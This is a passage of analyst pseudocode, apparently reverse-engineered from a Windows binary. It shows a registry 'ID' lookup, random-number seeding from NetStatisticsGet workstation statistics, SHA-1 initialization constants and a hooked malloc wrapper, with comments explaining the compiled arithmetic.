                     REG_OPTION_NON_VOLATILE /*0x00*/, 
                        0x2001f /*READ_CONTROL 0x20000 | KEY_NOTIFY 0x10 | KEY_ENUMERATE_SUB_KEYS 0x8 | 
                                KEY_CREATE_SUB_KEY 0x4 | KEY_SET_VALUE 0x2 | KEY_QUERY_VALUE 0x1*/, NULL
                            &keyHandle, NULL)
    retVal = RegQueryValueExW(keyHandle, L"ID", NULL, &type, &xxxsysID, &size)
    if retVal != ERROR_SUCCESS /*0x00*/:
        if funcAddrsPtr == 0x0:
            funcAddrsPtr = &funcAddrs
        if funcAddrsPtr[1] /*callGenRandom*/ != 0x00:
            callGenRandom(&xxxsysID, 8)

ranOnce = FALSE

callGenRandom(char* dst, int size):
    genRandom(dst, size)
genRandom(char* dst, int,size):
    if size<=0:
        return 1
    
    //Essentially zeroes the 1s digit and increases value of the tens digit by 1
    //Which boils down to this formula: ((size-1)//10) + 1) * 10
    edx:eax = 0x66666667*(size-1)
    edx = edx >> 2
    eax = edx + 1
    esi = eax+ eax*4
    esi = esi + esi

    if ranOnce == FALSE:
        setupDataSources()
        ranOnce = TRUE

setupDataSources():
    OSVERSIONINFOW lpVersionInformation;
    lpVersionInformation.dwOSVersionInfoSize = 0x114
    GetVersionExW(&lpVersionInformation)
    advapi32H = LoadLibraryW("ADVAPI32.DLL")
    kernel32H = LoadLibraryW("KERNEL32.DLL")
    netapi32H = LoadLibraryW("NETAPI32.DLL")
    if netapi32H != 0:
        NetStatisticsGet = GetProcAddress(netapi32H, "NetStatisticsGet")
        NetApiBufferFree = GetProcAddress(netapi32H, "NetApiBufferFree")
        if NetStatisticsGet != 0x00 && NetApiBufferFree != 0x00:
            _STAT_WORKSTATION_0 workstationStats;
            retVal = NetStatisticsGet(NULL, SERVICE_WORKSTATION /*L"LanmanWorkstation"*/, 0, 0, &workstationStats)
            if retVal == NERR_Success /*0x00*/:
                if funcAddrsPtr == 0x00:
                    funcAddrsPtr = &funcAddrs
                if funcAddrsPtr[3] /*func0x1c180*/ != 0x00:
                    func0x1c180(&workstationStats, 0xd8, 45.0)

func0x1c180(_STAT_WORKSTATION_0* netStats, int int1 , double double1):
    [0x460784] = [0x460784] + int1
    if [0x460784] < 0x3ff:
        if [0x460780] < 0x3ff && [0x460780] < [0x460784] :
            [0x460780] = [0x460784]
    else:
        a = (([0x460784] * 0x7fdff7fd) >> 0x20) - [0x460784]
        [0x460784] = [0x460784] + (((a >> 9) - (a >> 0x1f)) * 0x3ff)
    [0x46078c] = [0x46078c] + (0 < int1 % 0x14) + int1 / 0x14

    if int1>0:
        storeInt = ((int1 -1) / 0x14) + 1
        int1Store = int1
        if int1>0x14:
            int1Store = 0x14
        cbVar = 0
        func0x1b160(funcArr, &cbVar)

func0x1b160(void* funcArr, char** stringArr):
    stringArr[2] = stringArr[2] & 0xfffffffd
    string1 = stringArr[0]
    if string1 != &funcArr:
        if string1 != 0x00 && string1[0x44] != 0x00:
            string3 = stringArr[3]
            if [0x480188] != 0x00:
                [0x480188](string3,0)
            _free(string3)
            if [0x480188] != 0x00:
                [0x480188](0,1)
        stringArr[0] = &funcArr
        if (stringArr[2] & 0x100) == 0 && funcArr[0x44] != 0x00:
            stringArr[5] = funcArr[0x14]
            if funcArr[0x44] < 1:
                mallocAddr = 0x00
            else:
                mallocAddr = func0x230b0(funcArr[0x44])
            stringArr[3] = mallocAddr
            if mallocAddr == 0x00:
                return 0
    func0x1b2b0 = stringArr[4]
    if (func0x1b2b0 != 0x00) && ([func0x1b2b0] != 0x00):
        funcAddr = [func0x1b2b0+100]
        if funcAddr != 0x00: 
            retVal = funcAddr(stringArr[4],7,0,&stringArr)
            if (stringArr[8] == 0x00 || (stringArr[8] & 0xf8) == 0x00 || retVal < 1) && retVal != -2:
                return 0
    if stringArr[2] & 0x100 == 0x00:
                /*func0x1b2b0*/
        retVal = stringArr[4](stringArr)
        return retVal
    return 1

func0x1b2b0(int dst_)
    dst = dst_ + 0xc
    _memset(dst, 0x00, 0x60)
    dst[0] = 0x67452301
    dst[0x4] = 0xefcdab89
    dst[0x8] = 0x98badcfe
    dst[0xc] = 0x10325476
    dst[0x10] = 0xc3d2e1f0
    return 1

func0x230b0(int size):
    [0x43dee0] = 0x00
    if [0x480184] != 0x00:
        [0x43dee4] = 0x00
        [0x480184](0)
    mallocAddr = _malloc(size)
    if [0x480184] != 0x00:
        [0x480184](mallocAddr, size, )

    if mallocAddr != 0x00 && size > 0x800:
        [mallocAddr] = 0x46077d
    return mallocAddr

